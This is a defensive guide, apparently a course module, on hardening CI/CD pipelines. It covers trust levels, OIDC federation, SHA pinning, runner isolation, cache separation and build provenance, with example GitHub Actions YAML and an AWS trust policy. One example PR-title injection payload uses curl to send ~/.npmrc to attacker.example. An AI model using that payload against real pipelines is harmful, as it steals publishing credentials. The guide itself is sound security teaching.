# Pipeline Platforms: The Most Privileged System You Have

_Module 30 · CI/CD Pipelines · 30.3a_

## The Problem

Suppose a 25-engineer company builds field-service scheduling software. They have a private monorepo for the product and a public, open-source SDK that customers use to integrate with it. CI/CD runs on GitHub Actions, it's fast, and it deploys a dozen times a day. Nobody thinks of it as a security system. Over one year, four things happen.

**A pull request publishes a malicious SDK.** The SDK repository wanted to label incoming PRs and post test coverage as a comment, which needs a token with write access. The `pull_request` event gives fork PRs no secrets, so someone switched the workflow to `pull_request_target`, which does. The workflow then checked out the PR's code and ran `npm install` and the tests. A stranger opened a PR adding an innocent-looking dependency with a `postinstall` script. The script read the npm publish token, also available in that context, and published a new SDK version with a credential stealer inside. Customers installed it for six hours.

**A key nobody can rotate.** An AWS access key with administrator rights was added as an organization-wide secret three years ago by an engineer who has since left. It's available to all 140 repositories. Log masking hides it if printed directly, but not if someone prints it base64-encoded, and any engineer can do that from a branch by editing the workflow file in their own PR. Nobody knows every pipeline that uses the key, so rotating it would break an unknown number of things. So it's never been rotated.

**A dependency of the pipeline turns hostile.** Many workflows use a popular third-party action referenced by a version tag, `@v35`. The action's repository is compromised, and its tags are moved to a commit that dumps the runner's memory, including secrets, into the job log. The SDK's logs are public, because the repository is. This isn't hypothetical: it's what happened to the widely used `tj-actions/changed-files` action in March 2025.

**A build machine that remembers.** For a GPU-dependent test suite, the team runs a self-hosted runner on a long-lived VM. Jobs share its disk. One job's leftovers, a modified `~/.npmrc` pointing at a different registry and a cached dependency directory, are still there when the next job runs. A release build picks them up.

Each incident comes from two facts meeting. **The pipeline runs code written by anyone who can open a pull request**, since running that code is the whole point of CI. And **the pipeline holds credentials that reach production**, since deploying is the whole point of CD. In most companies, the CI/CD platform is the system with the broadest access to production, and one of the least carefully guarded.

## What It Is

A **CI/CD platform** has five parts: an orchestrator that reacts to events (a push, a PR, a tag, a schedule) and reads pipeline definitions from the repository; **runners** that execute jobs; a secret and identity store; storage for caches and artifacts; and usually a marketplace of reusable steps (actions, orbs, plugins, templates).

The concept that matters is the platform as a **trust boundary**. Different pipeline runs deserve different amounts of trust depending on who wrote the code being run and who reviewed it. Credentials, write permissions, and anything that feeds a release belong only to the trusted runs. Most CI/CD security failures are a trusted capability leaking into an untrusted run, or untrusted output leaking into a trusted one.

This article sits between two neighbors. Module 20.3 covers secrets management in general (vaults, rotation), and this is the pipeline-specific part of it. The broader **software supply chain** (every dependency your product ships, not just the pipeline's) is a bigger topic; the pipeline is the part of it you operate yourself.

## Recognizing the Problem

- Cloud credentials in CI are long-lived access keys, and nobody knows when they were last rotated.
- Secrets are defined at organization level and available to every repository and every branch.
- Workflows use `pull_request_target`, `workflow_run` or comment triggers, and also check out or run the PR's code.
- Third-party actions or plugins are referenced by tag or branch (`@v3`, `@main`), not by commit.
- Workflow files don't declare `permissions:`, so the automatic token has the default scope.
- Values from PR titles, branch names or issue bodies appear inside `${{ }}` in `run:` scripts.
- Self-hosted runners are long-lived and shared between jobs, or attached to a public repository.
- The same cache is restored by PR builds and release builds.
- Nobody reviews changes to pipeline definitions any differently from other code.
- Production can't tell whether an image came from your pipeline or from someone's laptop.

## How It Works

### 1. Sort runs by trust

Every pipeline run falls into one of three trust levels, and the most important design step is deciding which is which:

```
UNTRUSTED       code from outside the org       fork PRs to a public repo
                                                → no secrets, read-only token

SEMI-TRUSTED    code anyone with write access   any branch, any internal PR
                can push, unreviewed            (includes edits to the workflow
                                                file itself) → test credentials only

TRUSTED         code that passed review and     main after merge, protected tags,
                branch protection               protected environments
                                                → production credentials, publishing,
                                                  cache writes that releases use
```

The middle level is the one teams miss. An internal branch is not trusted just because an employee pushed it: the workflow definition lives in the repository, and a branch can change it. Any secret available to branch pipelines is available to anyone with push access, whatever the workflow file currently says. Protecting production credentials therefore means binding them to something a branch can't change: a protected branch, a protected tag, or a deployment **environment** with its own rules (GitHub environments, GitLab protected environments).

The SDK incident was a run from the first level executed with the third level's power. `pull_request_target` runs in the context of the base repository, with its secrets and a write-capable token, precisely so that trusted automation can act on untrusted PRs. It's safe only as long as it never executes the PR's code. The moment such a workflow checks out the PR head and runs a build, a test, or even `npm install`, the stranger's code runs with the repository's secrets. GitHub Security Lab calls this a "pwn request." The safe pattern splits the work into two workflows: an unprivileged one that runs the PR's code and uploads results as an artifact, and a privileged one that reads that artifact as data and posts the comment.

### 2. Identity instead of stored secrets

A stored cloud key is a password that works from anywhere, for anyone who has it, until someone rotates it. The alternative is **workload identity federation** over OpenID Connect (OIDC). Each job can request a short-lived, signed token from the platform describing exactly what it is: which repository, which branch or environment, which workflow, and which event triggered it. The cloud provider is configured to trust tokens from that platform, and to exchange them for temporary credentials only when the token's claims match a policy. For example: only repository `acme/app`, only the `production` environment.

Nothing long-lived is stored. Nothing works after the job ends. "Which pipelines can deploy to production?" becomes a policy you can read instead of an unknowable list of places a key was pasted. AWS, Google Cloud, Azure, HashiCorp Vault and most major registries support it, and GitHub Actions, GitLab CI, CircleCI and others issue the tokens.

It moves the risk into the trust policy, and the failure there is quiet: a policy that checks only the audience claim, or matches `repo:acme/*`, will hand production credentials to any workflow those claims match. That can include every repository in the organization, or, with only the audience checked, any GitHub workflow anywhere.

Where static secrets remain (a third-party API key with no federation support), scope them to the environment that needs them and remember that **log masking is not protection**. It hides exact matches of the secret string in logs, and anyone who controls the code can transform it before printing.

### 3. Least privilege for the pipeline's own token

Most platforms give each job an automatic token for the repository itself (`GITHUB_TOKEN`, GitLab's `CI_JOB_TOKEN`). Its default scope varies by platform, organization settings and when the repository was created. Declare it explicitly: nothing at the top of the workflow, and each job requests only what it uses (read contents, write packages, request an OIDC token). A test job that can push to the repository is a compromised dependency away from pushing to the repository.

A smaller version of the same idea: checkout steps often store the token in the local Git configuration so later steps can push. If no later step needs to push, don't keep it there, because every later step, including third-party code, can read it.

### 4. The runner

Runners execute arbitrary code by design, so the questions are what they can reach and what they remember.

- **Ephemeral beats persistent.** A fresh VM or container per job, destroyed afterward, means nothing one job does can affect the next. The build-machine incident was a persistent runner remembering. Hosted runners are ephemeral by default. Self-hosted ones can be made ephemeral too (GitHub's `--ephemeral` runner mode, autoscaling controllers on Kubernetes), and should be.
- **Self-hosted runners and public repositories don't mix.** If a fork PR can schedule a job on your runner, a stranger can run code inside your network. GitHub's documentation explicitly advises against self-hosted runners on public repositories.
- **Network position is privilege.** A self-hosted runner inside a private network can reach whatever that network reaches. Put runners in their own segment, with access only to what builds genuinely need.
- **Separate runner pools by trust level.** The machines that run PR builds shouldn't be the ones that build releases.

### 5. The pipeline's own dependencies

Every third-party action, orb, plugin and CI image is code running with your job's permissions. The `changed-files` incident worked because a tag like `@v35` is a movable pointer: whoever controls the repository can point it at different code, and every workflow referencing the tag runs the new code on its next run, with no change in your repository and no review.

**Pin by full commit SHA.** A commit hash can't be moved. Add the version as a comment for humans, and let Dependabot or Renovate propose updates as reviewable PRs, which is 30.1a's rule of giving each change its own PR, applied to the pipeline. The same goes for container images used as job environments: pin by digest. On self-hosted platforms the concern is sharper. Jenkins plugins run inside the controller with broad access, so every installed plugin is effectively trusted with everything Jenkins can reach.

Beyond pinning: prefer fewer third-party steps, especially for trivial work that a two-line shell command does just as well, and give the jobs that use them the least privilege.

### 6. Injection through event data

Pipeline definitions are templates, and some of the values filled into them come from attackers: PR titles, branch names, commit messages, issue comments. In GitHub Actions, `${{ … }}` expressions are substituted into a `run:` script's text before the shell sees it. A PR title containing `"; curl … ; echo "` becomes part of the script. The fix is to never interpolate untrusted values into code. Pass them as environment variables, which the shell treats as data. Linters for workflow files (actionlint, zizmor) flag this pattern automatically.

### 7. Caches and artifacts cross trust boundaries

30.1b's caches are only as trustworthy as whoever last wrote to them. If an untrusted or semi-trusted run can write a cache entry that a release build later restores, then untrusted code gets into the release without ever being reviewed. GitHub scopes caches so a PR branch's caches aren't visible to the default branch. But workflows that run in the default branch's context on untrusted input (`pull_request_target`, comment-triggered workflows) write into the default branch's scope. Security researchers have demonstrated exactly this poisoning path.

The same rule applies to build artifacts passed between workflows, and to remote build caches. **Trusted builds restore only what trusted builds wrote,** or restore nothing: release builds can skip caching entirely and pay a few minutes for certainty. For remote caches, only trusted CI writes; developers and PR builds read.

### 8. Prove what built the artifact

30.2a promotes artifacts by digest, which proves _which_ artifact is running, not _where it came from_. An image pushed to your registry with a stolen token looks exactly like one your pipeline built. **Build provenance** closes that gap: the pipeline signs a statement saying "this digest was built from this commit, by this workflow, on this platform," using its OIDC identity rather than a stored key (Sigstore does this, and GitHub's artifact attestations build on it). Production then verifies before running: a deploy step or a cluster admission policy rejects any image without valid provenance from the expected repository and branch.

The SLSA framework (Supply-chain Levels for Software Artifacts) grades how strong this evidence is, from "provenance exists" up to builds on hardened, isolated infrastructure. It gives a vocabulary for how far to go.

### 9. Protect the pipeline definition

The pipeline's definition is code that controls production access, and it lives in the repository. Treat changes to it accordingly. Require review from owners for workflow and CI directories (`CODEOWNERS` on `.github/workflows/`). Centralize the sensitive parts in reusable workflows or templates owned by a platform team, so a product repository calls "deploy" rather than reimplementing it. And rely on environment protection, not the workflow file's contents, to decide who gets production credentials, since a branch can rewrite the file.

## Choosing a Platform

With the trust model in mind, the differences between platforms that matter are easier to see. Popularity and feature lists matter less.

| Platform           | Hosting                                    | Strengths                                                                                         | Watch for                                                                                                      |
| ------------------ | ------------------------------------------ | ------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| **GitHub Actions** | SaaS, with self-hosted runners; GitHub Enterprise Server on-prem | Built into GitHub; event-driven; huge marketplace; environments, OIDC, attestations built in | Marketplace steps are third-party code; the `pull_request_target` family of triggers; per-minute cost for large or macOS runners |
| **GitLab CI**      | SaaS or self-managed                       | Built into GitLab; protected branches, variables and environments; merge trains; built-in registry | Tied to GitLab; self-managed means operating all of GitLab                                                     |
| **Jenkins**        | Self-hosted only                           | Runs anywhere; unlimited flexibility; enormous plugin ecosystem                                   | You operate and patch it; plugins run with broad privilege; the controller holds every credential; configuration drifts into the UI |
| **CircleCI**       | SaaS, with self-hosted runners             | Works with GitHub, GitLab and Bitbucket; strong caching and timing-based test splitting; reusable orbs | A third party holds your secrets: its 2023 security incident required customers to rotate all of them          |

Two others show the range. **Buildkite** runs its control plane as a service while all execution happens on your own agents, so code and secrets stay on infrastructure you control. **Tekton** and **Argo Workflows** are Kubernetes-native building blocks, for teams that want pipelines as cluster resources.

The questions that actually decide it:

- **Where does the code live?** The CI built into your forge (GitHub, GitLab) is the default answer. It has the tightest integration with PRs, branch protection and merge queues, and one fewer system holding credentials.
- **Where must code and secrets stay?** Regulatory or contractual limits may require self-hosting, or a hybrid model like Buildkite.
- **What do builds need?** GPUs, ARM, macOS, very large machines, or access to private networks may decide between hosted and self-hosted runners before anything else does.
- **Who will operate it?** Jenkins can do anything, and someone has to patch it, manage its plugins and secure its controller indefinitely.

Most of this article's practices exist on every serious platform under different names. The platform matters less than whether the trust model is applied.

## When It's Appropriate

- **Any pipeline with production credentials,** which means every pipeline that deploys. Sorting runs by trust, environment-scoped credentials and least-privilege tokens apply from the first deploy job.
- **Public repositories, immediately.** Fork PRs mean strangers' code runs in your CI. The trigger and runner rules in mechanisms 1 and 4 aren't optional there.
- **OIDC federation** wherever a long-lived cloud or registry key exists and the provider supports federation, which today is most of them.
- **SHA pinning** for every third-party step, in every repository. It costs one bot configuration.
- **Provenance and deploy-time verification** once artifacts are promoted by digest (30.2a), and especially where customers or auditors ask how you know what's running. That's increasingly common in regulated industries and for vendors selling to governments.
- **Separate runner pools** once there are self-hosted runners at all.

## When It's Unnecessary or Overkill

- **SLSA's higher levels for a small internal service.** Hardened, isolated build infrastructure is a large investment. Provenance on your main artifacts plus verification at deploy time covers most of the realistic risk.
- **Self-hosting to feel safer.** A self-hosted Jenkins that nobody has time to patch is usually less safe than a hosted platform used carefully. Self-host for a concrete requirement: data location, hardware, network access.
- **Custom tooling that duplicates the platform.** Before building a secrets broker or a signing service, check what the platform already provides; OIDC, environments and attestations are often built in.
- **Heavy review gates on every workflow change in a tiny team.** Code owners on workflow files are cheap; a separate security sign-off on every CI tweak in a four-person team is not proportionate.

## Trade-offs

- **Security steps add friction to legitimate work.** Environment reviewers, restricted secrets, and split privileged and unprivileged workflows make some automation harder to write. Posting a coverage comment on a fork PR goes from one workflow to two.
- **OIDC concentrates risk in trust policies.** They're short, rarely looked at, and fail open when too broad. They need review like any other access-control code.
- **Pinning creates update volume.** SHA-pinned steps and digest-pinned images mean a steady stream of bot PRs. Ignoring them leaves you on old, possibly vulnerable versions, the same trade as dependency pinning in 30.1a.
- **Ephemeral runners are slower and cost more to start.** No warm caches on disk, no preinstalled leftovers. 30.1b's caching work matters more, and has to respect mechanism 7.
- **Skipping caches in release builds costs minutes** on every release.
- **Provenance verification can block deploys.** A signing outage, an expired trust configuration or a misconfigured policy stops production changes, including emergency fixes. It needs a documented, audited override, just like 30.1a's break-glass path.
- **Hosted platforms put your secrets with a vendor; self-hosted platforms put the operational burden on you.** Neither is free of risk, and the risks are different kinds.

## Alternatives

- **Separate CI from CD.** Run CI on a platform that never holds production credentials, and deploy through a separate system: a GitOps agent inside the cluster that pulls approved digests (30.2a), or a dedicated deployment service. The CI platform then can't deploy even if compromised. This is a strong design for high-value environments, at the cost of a second system to run.
- **Human-held credentials for production.** Deploys require a person to authenticate. It's simple and limits automation's reach, and it brings back the manual release step that 30.2a removes. Some regulated environments require it anyway.
- **Accept the risk explicitly.** A small private repository with no fork PRs, few collaborators and no production access from CI has a much smaller attack surface. Pin actions and declare permissions, and much of the rest can wait until the situation changes.

## How to Achieve It

1. **Inventory.** List every secret in the CI platform, where it's scoped, and which workflows use it. List every third-party step and self-hosted runner. _Signal:_ you can answer "what can a PR on a fork do?" and "what can any engineer's branch do?" in writing.
2. **Fix the cheap, high-value things.** Declare `permissions:` in every workflow, pin third-party steps by SHA with a bot to update them, remove `pull_request_target` workflows that execute PR code, and add a workflow linter to CI. _Signal:_ the linter passes everywhere.
3. **Scope secrets to environments.** Move production secrets from organization or repository level to protected environments tied to main or release tags. _Signal:_ a branch that edits its workflow to print a production secret gets nothing.
4. **Replace stored cloud keys with OIDC,** starting with production, with trust policies pinned to specific repositories and environments. Revoke the old keys. _Signal:_ no long-lived cloud credential exists in CI.
5. **Make runners ephemeral and separate them by trust.** _Signal:_ no job can see another job's leftovers.
6. **Separate caches by trust.** Release builds restore only trusted caches, or none. _Signal:_ nothing a PR can write reaches a release artifact.
7. **Add provenance and verify it at deploy.** _Signal:_ an image pushed by hand, even with valid registry credentials, is refused by production.

## Implementation

The mechanisms here live in configuration rather than in a general-purpose language, so the implementation is GitHub Actions YAML plus an AWS trust policy. Three pieces: the untrusted side, the trusted side, and the policy that joins trusted runs to cloud credentials.

### The untrusted side: PR checks

```yaml
# .github/workflows/pr.yml — runs code from anyone who can open a PR
on: pull_request # NOT pull_request_target: no secrets, read-only token
permissions:
  contents: read # the only thing this workflow may do
jobs:
  test:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@<full-commit-sha> # v4.2.2
        with:
          persist-credentials: false # don't leave the token in .git/config
      - uses: actions/setup-node@<full-commit-sha> # v4.4.0
        with: { node-version-file: .nvmrc }
      - run: npm ci
      - run: npm test
      - name: Report the PR title # untrusted input passed as data, not code
        env:
          TITLE: ${{ github.event.pull_request.title }}
        run: echo "Tested: $TITLE"
```

> **The injection this avoids.** Written as `run: echo "Tested: ${{ github.event.pull_request.title }}"`, the title is pasted into the script text before the shell runs it. A PR titled `x"; curl -d @$HOME/.npmrc https://attacker.example; echo "` would execute the `curl`. In this read-only workflow the damage is limited, and the same line in a privileged workflow would exfiltrate its secrets. Passing it through `env` makes the title a variable's value, which the shell never parses as code.

### The trusted side: release

```yaml
# .github/workflows/release.yml — runs only reviewed code from main
on:
  push:
    branches: [main]
permissions: {} # nothing by default; each job asks for what it needs
jobs:
  release:
    runs-on: ubuntu-24.04
    environment: production # production OIDC trust and secrets are bound to this
    permissions:
      contents: read
      id-token: write # may request an OIDC token
      packages: write # may push to the registry
      attestations: write # may record provenance
    steps:
      - uses: actions/checkout@<full-commit-sha> # v4.2.2
        with: { persist-credentials: false }
      - uses: docker/build-push-action@<full-commit-sha> # v6
        id: push
        with:
          push: true
          tags: ghcr.io/acme/app:${{ github.sha }}
          no-cache: true # restore nothing another context could have written
      - uses: actions/attest-build-provenance@<full-commit-sha> # v2
        with:
          subject-name: ghcr.io/acme/app
          subject-digest: ${{ steps.push.outputs.digest }}
          push-to-registry: true
      - uses: aws-actions/configure-aws-credentials@<full-commit-sha> # v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/deploy-production
          aws-region: eu-west-1
      - run: ops/deploy --image "ghcr.io/acme/app@${{ steps.push.outputs.digest }}"
```

There are no stored AWS keys anywhere. The AWS step exchanges the job's OIDC token for temporary credentials, which works only because this job runs in the `production` environment. The deploy step, or an admission policy in the cluster, can then refuse anything without valid provenance, for example with `gh attestation verify oci://ghcr.io/acme/app@sha256:… --owner acme`.

### The policy that decides who gets production

```json
{
  "Effect": "Allow",
  "Principal": {
    "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
  },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub": "repo:acme/app:environment:production"
    }
  }
}
```

The `sub` claim is the heart of it. For jobs that declare an environment, GitHub sets it to `repo:<org>/<repo>:environment:<name>`, so this role can be assumed only by `acme/app` jobs running in the `production` environment. The environment's protection rules (deploy only from main, optionally required reviewers) are what a branch can't change.

> **The quiet failure.** Delete the `sub` condition and the policy still works, since every deploy succeeds. It now also accepts a token from _any_ GitHub Actions workflow in any repository, because the audience check alone only proves the token came from GitHub. Loosening it to `StringLike` with `repo:acme/*` hands production to every repository in the organization, including the public SDK that accepts fork PRs. Trust policies fail open, silently, which is why they belong under the same review as the workflows.

## Further Reading

- **GitHub Docs, "Security hardening for GitHub Actions,"** and **"About security hardening with OpenID Connect."** The platform's own guidance on triggers, tokens, runners and OIDC claims.
- **GitHub Security Lab, "Keeping your GitHub Actions and workflows secure"** (Jaroslav Lobačevski, 2020–2021), especially Part 1 ("Preventing pwn requests") and Part 2 ("Untrusted input"). The clearest explanation of mechanisms 1 and 6.
- **OWASP, "Top 10 CI/CD Security Risks."** A platform-neutral map of how pipelines get compromised.
- **CISA and NSA, "Defending Continuous Integration/Continuous Delivery (CI/CD) Environments"** (2023). Government guidance, useful when you need an external reference for the practices.
- **SLSA** (slsa.dev) and **Sigstore** (sigstore.dev). Build levels, provenance, and keyless signing.
- **The March 2025 `tj-actions/changed-files` compromise (CVE-2025-30066)** and its public write-ups. A short, concrete case for SHA pinning.
- **Adnan Khan, "The Monsters in Your Build Cache: GitHub Actions Cache Poisoning"** (2024). How caches carry untrusted content into trusted builds.
- **actionlint** and **zizmor**. Static analysis for workflow files, catching injection, excessive permissions and dangerous triggers.
- Within this collection: **20.3** for secrets management generally, **3.4** for runtime configuration and secrets, **30.1b** for caching, **30.2a** for digest promotion, **30.4a** for container images, **34** for compliance.

A GitLab CI sibling would be worth writing. Its trust model is organized around _protected_ branches, tags, variables and environments rather than around trigger types: a variable marked protected is simply absent from pipelines on unprotected refs, and job tokens and OIDC (`id_tokens`) are scoped differently. The same threats map onto a different set of controls, and seeing both makes the underlying trust model clearer than either platform alone. Not yet written.

---

The habit worth carrying out of this article: **for every pipeline run, ask whose code is running and what it can reach.** If the answers are "anyone's" and "production," something is wrong, however the workflow file reads today. Workflow files describe what a pipeline _intends_ to do. The trust boundary is defined by what code in that run _could_ do, and on a platform that runs arbitrary code by design, that's usually much more.
